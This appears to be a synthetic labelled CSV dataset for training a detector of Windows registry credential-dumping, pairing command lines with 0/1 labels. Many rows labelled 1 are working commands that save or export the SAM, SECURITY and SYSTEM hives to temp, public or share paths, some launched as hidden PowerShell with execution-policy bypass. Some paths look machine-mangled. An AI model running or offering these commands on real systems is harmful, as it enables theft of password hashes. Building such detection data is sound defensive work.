text,label
pwsh -noprofile -c reg.exe   export hkey_local_machine\security \.\c$ackup.reg,1
powershell -command reg.exe save hklm\sam c:\users\public\registry_export.reg /y,1
"powershell -c reg add ""hkcu\software\google\chrome"" /v path /t reg_dword /d ""c:\program files\app""",0
"powershell -c reg.exe restore ""hkey_current_user\control panel\desktop\subkey8"" ""hkey_current_user\software\myapp\settings_434""",0
powershell -command reg.exe export hkey_local_machine\sam   c:\windows\temp\sam.save   /y,1
"start /b reg.exe  add  ""hku\software\microsoft\windows\currentversion""  /f  /t reg_sz",0
"powershell -c reg  add  ""hkey_current_user\control panel\desktop\subkey84""  /v lastupdate  /t reg_sz  /d 1",0
reg  export hklm\security   \\localhost\c$\__dump\sam.bak   /y,1
reg.exe   export hkey_local_machine\system   %temp%\sec_backup.dat /y,1
powershell -exec bypass -w hidden -c reg   export  hkey_local_machine\sam   c:\windows\temp\sam.save /y,1
reg export   hkey_local_machine\system   %temp%\sec_backup.dat /y,1
powershell -command reg.exe   save  hkey_local_machine\security c:\temp\system.hive  /y,1
"powershell -c reg  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""  ""c:\windows\temp\software_dump.dat""  /y",0
cmd.exe /c start /b reg.exe   save  hkey_local_machine\system c:\temp\system.hive,1
"start /b reg.exe  unload  ""hku\environment\subkey76""  /v version",0
"reg  save  ""hku\software\google\chrome\subkey16""  ""d:\backup\registry_hive.dat""  /y",0
"reg.exe compare ""hku\software\microsoft\windows\currentversion\subkey29"" ""hku\software\classes_481""",0
powershell -command reg.exe  save   hklm\security c:\temp\system.hive,1
powershell -exec bypass -w hidden -c reg.exe save   hklm\sam   \.\c$ackup.reg,1
"reg.exe   delete   ""hkey_local_machine\software\classes""   /v lastupdate",0
"reg.exe   delete   ""hkcu\system\currentcontrolset\services""",0
"cmd /c reg.exe   add   ""hkey_users\hkey_local_machine\software\wow6432node\subkey24""      /t reg_dword   /d 1",0
"cmd /c powershell -c ""reg.exe  export  hkey_local_machine\security   c:\temp\system.hive""",1
pwsh -noprofile -c reg.exe  export   hklm\sam  c:\users\public\registry_export.reg,1
"reg.exe  add  ""hkey_local_machine\software\myapp\settings\subkey96""    /t reg_sz  /d 1",0
cmd.exe /c reg export   hkey_local_machine\system  \.\c$ackup.reg,1
"reg.exe  restore  ""hku\hkey_local_machine\system\currentcontrolset\control""  ""hku\software\google\chrome_888""",0
"start /b reg.exe delete ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey76"" /v lastupdate",0
"reg.exe save ""hkey_local_machine\system\currentcontrolset\services\subkey12"" ""%temp%\non_sensitive.hive""",0
"start /b reg  delete  ""hku\software\google\chrome""",0
"reg  unload  ""hkcu\software\myapp\settings""  /v path",0
"start /b reg.exe  copy  ""hku\system\currentcontrolset\services""  ""hku\hkey_local_machine\system\currentcontrolset\control_217""",0
powershell -exec bypass -w hidden -c reg.exe save hkey_local_machine\security \.\c$ackup.reg,1
cmd.exe /c reg.exe  save   hklm\sam \\localhost\c$\__dump\sam.bak,1
cmd.exe /c reg.exe  save  hklm\system c:\temp\system.hive /y,1
powershell -exec bypass -w hidden -c reg.exe save hklm\sam   c:\temp\system.hive,1
powershell -command reg.exe   export  hklm\security %temp%\sec_backup.dat /y,1
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey14""  ""%temp%\non_sensitive.hive""",0
"cmd /c reg.exe delete ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" /f",0
"reg   query   ""hkey_local_machine\software\classes""   /v lastupdate",0
cmd.exe /c start /b reg   export hkey_local_machine\security c:\windows\temp\sam.save  /y,1
"reg.exe restore ""hkcu\software\myapp\settings\subkey75"" ""hkcu\software\myapp\settings_902""",0
"cmd /c reg.exe  delete  ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control""  /v version",0
"cmd /c reg  query  ""hkey_users\hkey_local_machine\system\currentcontrolset\control""",0
"reg.exe copy ""hkey_current_user\control panel\desktop\subkey78"" ""hkey_current_user\software\classes_568""",0
"cmd /c powershell -c ""reg.exe save hklm\sam \.\c$ackup.reg /y""",1
"cmd /c reg.exe  delete  ""hkey_users\system\currentcontrolset\services\subkey67""  /v version",0
cmd.exe /c reg  save hkey_local_machine\system   %temp%\sec_backup.dat   /y,1
cmd.exe /c reg save hklm\security  %temp%\sec_backup.dat,1
cmd.exe /c start /b reg save  hklm\sam  c:\windows\temp\sam.save,1
"reg   add   ""hkey_current_user\software\microsoft\windows\currentversion""   /v lastupdate",0
"reg  add  ""hkey_local_machine\software\myapp\settings""      /d ""1.0.0""",0
cmd.exe /c start /b reg.exe   save hkey_local_machine\security   %temp%\sec_backup.dat /y,1
cmd /c reg save HKEY_LOCAL_MACHINE\Software\Policies C:\Backup\pol.reg,0
powershell -command reg.exe   save  hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
"reg   compare   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey69""   ""hkey_local_machine\control panel\desktop_843""",0
reg  save  hkey_local_machine\security   c:\users\public\registry_export.reg   /y,1
powershell.exe,0
"reg.exe   delete   ""hkcu\software\microsoft\windows\currentversion""   /v version",0
"reg  compare  ""hkey_current_user\software\microsoft\windows\currentversion\subkey3""  ""hkey_current_user\environment_217""",0
cmd.exe,0
"reg compare ""hku\software\policies\mycorp\subkey12"" ""hku\software\myapp\settings_821""",0
"cmd /c reg.exe   delete   ""hkcu\software\google\chrome\subkey34""   /v path",0
powershell -command reg   export   hklm\system c:\temp\system.hive  /y,1
"reg.exe   add   ""hkey_users\system\currentcontrolset\services""   /v version   /t reg_sz   /d ""1.0.0""",0
pwsh -noprofile -c reg.exe export  hkey_local_machine\system   %temp%\sec_backup.dat   /y,1
"reg.exe  restore  ""hkey_users\software\policies\mycorp\subkey100""  ""hkey_users\software\microsoft\windows\currentversion_941""",0
cmd.exe /c reg.exe   save hklm\sam \\localhost\c$\__dump\sam.bak  /y,1
c:\windows\system32\cmd.exe /k reg.exe export  hklm\sam  c:\users\public\registry_export.reg,1
"cmd /c reg   add   ""hkey_local_machine\software\policies\mycorp\subkey8""      /t reg_dword",0
powershell -exec bypass -w hidden -c reg export hklm\system  \\localhost\c$\__dump\sam.bak  /y,1
"reg  compare  ""hkey_users\control panel\desktop\subkey33""  ""hkey_users\hkey_local_machine\software\policies\microsoft_263""",0
powershell -exec bypass -w hidden -c reg save  hklm\security   c:\temp\system.hive,1
"reg compare ""hkey_current_user\software\microsoft\windows\currentversion"" ""hkey_current_user\software\myapp\settings_855""",0
powershell -exec bypass -w hidden -c reg save  hkey_local_machine\sam  c:\temp\system.hive,1
powershell -command reg.exe save   hklm\security  c:\windows\temp\sam.save /y,1
cmd.exe /c start /b reg.exe  export hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak /y,1
wmic.exe,0
powershell -command reg  save   hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak  /y,1
"reg.exe   save   ""hkey_local_machine\software\google\chrome""   ""d:\backup\registry_hive.dat""",0
reg save HKLM\Software\Wow6432Node C:\temp\wow64.reg,0
"cmd /c powershell -c ""reg.exe export   hklm\system \\localhost\c$\__dump\sam.bak   /y""",1
cmd.exe /c reg export   hkey_local_machine\sam  %temp%\sec_backup.dat,1
"reg   unload   ""hkcu\control panel\desktop""   /v path",0
"reg   query   ""hkey_current_user\software\myapp\settings""   /v version",0
"start /b reg.exe   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey68""   ""c:\users\public\chrome_data.bak""   /y",0
"start /b reg.exe   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""   ""c:\temp\user_settings.reg""",0
"reg add ""hkcu\control panel\desktop\subkey73""   /d 1",0
pwsh -noprofile -c reg.exe  save  hklm\system  c:\temp\system.hive /y,1
cmd.exe /c start /b reg.exe  save   hkey_local_machine\sam c:\temp\system.hive   /y,1
"reg.exe   query   ""hkey_users\software\google\chrome""   /v path",0
"powershell -c reg   compare   ""hkey_users\system\currentcontrolset\services""   ""hkey_users\environment_587""",0
powershell -command reg save  hklm\system   \.\c$ackup.reg   /y,1
"reg  compare  ""hkey_local_machine\environment""  ""hkey_local_machine\software\policies\mycorp_406""",0
c:\windows\system32\cmd.exe /k reg   export   hkey_local_machine\security c:\temp\system.hive /y,1
"start /b reg.exe save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" ""c:\users\public\chrome_data.bak""",0
powershell -exec bypass -w hidden -c reg save   hkey_local_machine\system   c:\temp\system.hive,1
"reg.exe compare ""hku\system\currentcontrolset\services"" ""hku\environment_549""",0
c:\windows\system32\cmd.exe /k reg  save hklm\system   \.\c$ackup.reg,1
"cmd /c reg  add  ""hkey_current_user\environment\subkey62""  /f  /t reg_dword  /d 1",0
reg  save  hklm\sam  \.\c$ackup.reg,1
"start /b reg.exe unload ""hkey_current_user\software\microsoft\windows\currentversion\subkey81"" /v version",0
"cmd /c powershell -c ""reg save   hklm\security   c:\windows\temp\sam.save  /y""",1
"cmd /c powershell -c ""reg.exe save   hklm\security  c:\users\public\registry_export.reg""",1
"cmd /c reg   save   ""hku\hkey_local_machine\system\currentcontrolset\control\subkey35""   ""c:\temp\user_settings.reg""",0
cmd.exe /c start /b reg.exe save hklm\security   c:\users\public\registry_export.reg,1
"cmd /c reg   query   ""hkey_current_user\software\classes""   /v version",0
"reg   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey69""   ""c:\users\public\chrome_data.bak""   /y",0
"reg  delete  ""hku\control panel\desktop\subkey18""",0
powershell -exec bypass -w hidden -c reg   export  hkey_local_machine\system   \.\c$ackup.reg,1
"cmd /c powershell -c ""reg  save  hkey_local_machine\sam   c:\temp\system.hive""",1
"start /b reg   copy   ""hkey_local_machine\software\microsoft\windows\currentversion""   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft_409""",0
"powershell -c reg unload ""hkey_current_user\control panel\desktop"" /v lastupdate",0
"reg  unload  ""hkey_local_machine\software\classes""  /v lastupdate",0
cmd.exe /c start /b reg export hklm\sam c:\users\public\registry_export.reg,1
cmd.exe /c start /b reg export   hklm\system \.\c$ackup.reg  /y,1
reg.exe export  hklm\system   c:\temp\system.hive,1
c:\windows\system32\cmd.exe /k reg.exe save  hklm\system c:\users\public\registry_export.reg  /y,1
"start /b reg copy ""hku\hkey_local_machine\system\currentcontrolset\control"" ""hku\software\microsoft\windows\currentversion_898""",0
"cmd /c powershell -c ""reg export hkey_local_machine\sam  c:\windows\temp\sam.save""",1
"reg.exe copy ""hkey_users\software\myapp\settings"" ""hkey_users\environment_583""",0
"reg   query   ""hku\software\classes""   /f",0
powershell -command reg.exe   save   hkey_local_machine\sam   \.\c$ackup.reg,1
cmd.exe /c reg.exe save  hklm\sam   c:\users\public\registry_export.reg  /y,1
cmd.exe /c reg.exe  export   hklm\sam  c:\windows\temp\sam.save,1
c:\windows\system32\cmd.exe /k reg.exe export   hkey_local_machine\sam   c:\windows\temp\sam.save,1
"cmd /c reg   compare   ""hkey_local_machine\system\currentcontrolset\services""   ""hkey_local_machine\software\policies\mycorp_921""",0
c:\windows\system32\cmd.exe /k reg.exe   export hklm\security  %temp%\sec_backup.dat,1
reg export   hklm\system  c:\temp\system.hive   /y,1
cmd.exe /c start /b reg.exe   export  hklm\sam c:\temp\system.hive   /y,1
powershell -command reg  export  hkey_local_machine\sam  c:\temp\system.hive  /y,1
reg.exe   export   hklm\sam  c:\temp\system.hive /y,1
cmd.exe /c reg  export  hklm\system  \.\c$ackup.reg   /y,1
powershell -exec bypass -w hidden -c reg.exe   export   hklm\sam \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg   export  hkey_local_machine\system   c:\windows\temp\sam.save  /y,1
"reg.exe  add  ""hku\hkey_local_machine\software\policies\microsoft""  /v version    /d ""c:\program files\app""",0
pwsh -noprofile -c reg   save hklm\sam   c:\users\public\registry_export.reg,1
"start /b reg unload ""hkey_users\hkey_local_machine\software\wow6432node\subkey74"" /v lastupdate",0
cmd.exe /c start /b reg.exe  export  hkey_local_machine\system   c:\temp\system.hive  /y,1
"powershell -c reg   compare   ""hkcu\control panel\desktop\subkey75""   ""hkcu\environment_866""",0
cmd.exe /c reg   save  hklm\security c:\windows\temp\sam.save,1
cmd.exe /c start /b reg.exe export  hklm\system c:\windows\temp\sam.save,1
"reg  query  ""hku\hkey_local_machine\software\wow6432node""  /f",0
"reg   copy   ""hkey_users\hkey_local_machine\software\wow6432node\subkey19""   ""hkey_users\environment_979""",0
cmd.exe /c reg.exe   export  hkey_local_machine\security c:\users\public\registry_export.reg,1
reg.exe  export hklm\security \.\c$ackup.reg,1
cmd.exe /c start /b reg  save  hkey_local_machine\system %temp%\sec_backup.dat   /y,1
powershell -command reg save   hklm\system   \\localhost\c$\__dump\sam.bak,1
"reg copy ""hkcu\system\currentcontrolset\services\subkey35"" ""hkcu\control panel\desktop_104""",0
cmd.exe /c start /b reg.exe  save hkey_local_machine\sam  c:\users\public\registry_export.reg,1
powershell -exec bypass -w hidden -c reg.exe   save  hklm\sam  c:\temp\system.hive,1
powershell -command reg   save   hkey_local_machine\sam %temp%\sec_backup.dat,1
powershell -command reg.exe export   hkey_local_machine\security c:\windows\temp\sam.save,1
"reg.exe   save   ""hku\software\classes""   ""%temp%\non_sensitive.hive""   /y",0
"reg.exe  add  ""hku\hkey_local_machine\software\wow6432node\subkey86""  /v version  /t reg_sz",0
cmd.exe /c reg save hklm\system \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg.exe   save hkey_local_machine\security c:\temp\system.hive /y,1
c:\windows\system32\cmd.exe /k reg.exe   export  hklm\system  c:\windows\temp\sam.save  /y,1
"reg.exe copy ""hkcu\control panel\desktop"" ""hkcu\software\microsoft\windows\currentversion_291""",0
c:\windows\system32\cmd.exe /k reg.exe export   hkey_local_machine\system  c:\users\public\registry_export.reg,1
"reg  unload  ""hkey_local_machine\software\policies\mycorp\subkey84""",0
cmd.exe /c reg.exe   export hkey_local_machine\system  \.\c$ackup.reg   /y,1
pwsh -noprofile -c reg.exe   export   hkey_local_machine\sam   \.\c$ackup.reg /y,1
"reg restore ""hkey_local_machine\software\microsoft\windows\currentversion"" ""hkey_local_machine\software\policies\mycorp_149""",0
pwsh -noprofile -c reg.exe  save hklm\security   \\localhost\c$\__dump\sam.bak,1
"reg.exe delete ""hku\software\myapp\settings\subkey29"" /v path",0
"reg.exe   copy   ""hkey_users\hkey_local_machine\software\policies\microsoft\subkey5""   ""hkey_users\software\google\chrome_375""",0
"cmd /c reg query ""hkey_users\system\currentcontrolset\services\subkey74""",0
"reg.exe  unload  ""hkcu\software\classes""  /v path",0
"reg save ""hkey_local_machine\hkey_local_machine\software\wow6432node"" ""d:\backup\registry_hive.dat""",0
pwsh -noprofile -c reg export  hkey_local_machine\security   c:\temp\system.hive,1
c:\windows\system32\cmd.exe /k reg  export hklm\sam  %temp%\sec_backup.dat  /y,1
"reg.exe query ""hkcu\hkey_local_machine\software\wow6432node""",0
"reg   query   ""hku\software\myapp\settings""   /v version",0
powershell -exec bypass -w hidden -c reg save hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y,1
powershell -exec bypass -w hidden -c reg.exe save  hkey_local_machine\security   c:\windows\temp\sam.save,1
"powershell -c reg   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""   ""c:\users\public\chrome_data.bak""   /y",0
reg  export  hklm\security c:\users\public\registry_export.reg /y,1
cmd.exe /c start /b reg.exe   export   hkey_local_machine\security  \\localhost\c$\__dump\sam.bak  /y,1
c:\windows\system32\cmd.exe /k reg   export  hkey_local_machine\sam c:\temp\system.hive   /y,1
cmd.exe /c start /b reg.exe  save  hklm\sam   \.\c$ackup.reg /y,1
"reg unload ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey35"" /v version",0
powershell -exec bypass -w hidden -c reg.exe export hkey_local_machine\sam   c:\users\public\registry_export.reg   /y,1
cmd.exe /c reg   export hklm\sam \.\c$ackup.reg  /y,1
"reg  add  ""hkey_users\hkey_local_machine\software\wow6432node\subkey2""    /t reg_sz  /d ""1.0.0""",0
powershell -exec bypass -w hidden -c reg.exe   save   hkey_local_machine\sam \\localhost\c$\__dump\sam.bak,1
"reg.exe  query  ""hkey_users\hkey_local_machine\software\policies\microsoft""  /v lastupdate",0
powershell -exec bypass -w hidden -c reg save hklm\system  \.\c$ackup.reg,1
cmd.exe /c start /b reg.exe  export   hklm\system   c:\users\public\registry_export.reg,1
"reg.exe copy ""hkcu\software\google\chrome"" ""hkcu\hkey_local_machine\software\wow6432node_149""",0
powershell -exec bypass -w hidden -c reg.exe  save  hkey_local_machine\security c:\users\public\registry_export.reg   /y,1
"cmd /c powershell -c ""reg.exe export  hklm\system  %temp%\sec_backup.dat""",1
reg.exe export   hklm\sam  c:\temp\system.hive,1
cmd.exe /c reg   save  hkey_local_machine\sam  c:\temp\system.hive,1
powershell -command reg save  hklm\sam   c:\windows\temp\sam.save,1
"reg.exe  query  ""hkey_current_user\environment\subkey27""  /v lastupdate",0
"reg.exe  compare  ""hkey_users\hkey_local_machine\system\currentcontrolset\control\subkey36""  ""hkey_users\software\policies\mycorp_369""",0
"start /b reg unload ""hkcu\system\currentcontrolset\services""",0
pwsh -noprofile -c reg  export   hklm\system   \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg save hkey_local_machine\system   c:\temp\system.hive /y,1
"reg.exe  add  ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey42""  /f    /d ""1.0.0""",0
cmd.exe /c reg   export   hkey_local_machine\system  c:\windows\temp\sam.save,1
reg   save hklm\system  c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg.exe  export  hkey_local_machine\sam %temp%\sec_backup.dat,1
"cmd /c powershell -c ""reg.exe  save hklm\system  c:\users\public\registry_export.reg  /y""",1
c:\windows\system32\cmd.exe /k reg   export   hklm\security   \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg.exe export   hklm\system  c:\users\public\registry_export.reg,1
"reg  save  ""hkey_current_user\software\classes""  ""%temp%\non_sensitive.hive""  /y",0
"reg   unload   ""hkcu\software\microsoft\windows\currentversion""   /v path",0
"reg   compare   ""hkey_local_machine\software\microsoft\windows\currentversion""   ""hkey_local_machine\control panel\desktop_935""",0
pwsh -noprofile -c reg.exe save  hklm\system  \.\c$ackup.reg   /y,1
cmd.exe /c reg export hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg.exe   save  hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
"reg.exe unload ""hkey_current_user\software\microsoft\windows\currentversion"" /v path",0
c:\windows\system32\cmd.exe /k reg export   hkey_local_machine\sam c:\temp\system.hive,1
pwsh -noprofile -c reg  export hkey_local_machine\sam   c:\windows\temp\sam.save,1
reg.exe   save  hklm\security  c:\temp\system.hive /y,1
"powershell -c reg.exe add ""hkey_users\software\classes\subkey61"" /f  /d ""c:\program files\app""",0
c:\windows\system32\cmd.exe /k reg save  hkey_local_machine\security   \\localhost\c$\__dump\sam.bak  /y,1
powershell -command reg  export   hklm\security   c:\windows\temp\sam.save  /y,1
"reg.exe  delete  ""hku\software\myapp\settings\subkey71""  /v lastupdate",0
"reg.exe   restore   ""hkey_users\hkey_local_machine\software\wow6432node""   ""hkey_users\system\currentcontrolset\services_903""",0
pwsh -noprofile -c reg.exe  save hklm\system \.\c$ackup.reg,1
"powershell -c reg.exe  add  ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey8""      /d ""1.0.0""",0
powershell -exec bypass -w hidden -c reg.exe save hklm\sam  %temp%\sec_backup.dat,1
"cmd /c powershell -c ""reg.exe   save   hklm\sam  %temp%\sec_backup.dat  /y""",1
pwsh -noprofile -c reg  export   hkey_local_machine\system c:\users\public\registry_export.reg,1
cmd.exe /c reg  save   hkey_local_machine\sam c:\users\public\registry_export.reg,1
powershell -exec bypass -w hidden -c reg   export hklm\security   c:\temp\system.hive   /y,1
cmd.exe /c start /b reg.exe export hkey_local_machine\security   \.\c$ackup.reg,1
reg.exe save  hkey_local_machine\sam %temp%\sec_backup.dat  /y,1
"start /b reg.exe   query   ""hkcu\software\classes\subkey74""",0
"powershell -c reg restore ""hku\software\google\chrome"" ""hku\software\google\chrome_463""",0
"start /b reg query ""hkey_current_user\software\myapp\settings"" /v path",0
powershell -command reg.exe  export hkey_local_machine\security  \.\c$ackup.reg /y,1
cmd.exe /c reg.exe export  hkey_local_machine\sam c:\windows\temp\sam.save,1
"reg.exe  unload  ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey66""  /v lastupdate",0
